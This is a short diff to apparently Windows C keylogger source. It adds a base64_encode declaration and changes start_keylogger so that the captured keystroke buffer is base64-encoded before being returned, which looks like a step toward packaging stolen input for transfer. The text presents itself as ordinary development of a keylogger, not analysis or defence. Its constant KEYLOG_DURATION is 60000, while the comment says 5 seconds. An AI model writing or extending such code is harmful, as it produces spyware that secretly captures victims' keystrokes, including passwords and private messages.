@@ -4,6 +4,9 @@
 #include <string.h>
 #include <time.h>
 
+// Declare base64_encode function
+extern char* base64_encode(const unsigned char* data, size_t data_len);
+
 #define MAX_KEYLOG_SIZE 8192
 #define KEYLOG_DURATION 60000  // Capture for 5 seconds
 
@@ -193,7 +196,7 @@ char* start_keylogger() {
     
     AppendToKeylog("\n=== Keylogger Stopped ===\n");
     
-    // Copy buffer to result
+    // Copy buffer to result and encode with base64
     EnterCriticalSection(&g_keylog_cs);
     if (g_keylog_pos > 0) {
         strncpy(result, g_keylog_buffer, MAX_KEYLOG_SIZE - 1);
@@ -203,5 +206,9 @@ char* start_keylogger() {
     }
     LeaveCriticalSection(&g_keylog_cs);
     
-    return result;
+    // Encode result with base64
+    char* encoded_result = base64_encode((unsigned char*)result, strlen(result));
+    free(result);
+    
+    return encoded_result;
 }
